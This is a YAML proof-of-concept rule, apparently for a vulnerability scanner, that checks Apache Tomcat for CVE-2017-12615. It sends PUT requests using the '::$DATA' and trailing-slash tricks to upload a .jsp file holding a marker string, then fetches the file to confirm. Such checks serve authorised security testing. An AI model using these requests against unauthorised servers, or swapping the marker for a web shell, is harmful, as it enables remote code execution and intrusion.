name: poc-yaml-tomcat-cve-2017-12615-rce
rules:
  - method: PUT
    path: '/9e66c3cd-07ca-4640-94cd-e7d59cd8e66d.jsp::$DATA'
    body: MIIEpQIBAAKCAQEAwqjTS40uIkvjj2uCyG68Gkm4Jo
    follow_redirects: false
    expression: |
      status==201
  - method: PUT
    path: '/9e66c3cd-07ca-4640-94cd-e7d59cd8e66d.jsp/'
    body: MIIEpQIBAAKCAQEAwqjTS40uIkvjj2uCyG68Gkm4Jo
    follow_redirects: false
    expression: |
      status==201
  - method: GET
    path: /9e66c3cd-07ca-4640-94cd-e7d59cd8e66d.jsp
    follow_redirects: false
    expression: |
      status==200 && body.bcontains(b'MIIEpQIBAAKCAQEAwqjTS40uIkvjj2uCyG68Gkm4Jo')

detail:
  author: n1nty
  links: 
    - https://www.seebug.org/vuldb/ssvid-96562
    - https://mp.weixin.qq.com/s/sulJSg0Ru138oASiI5cYAA
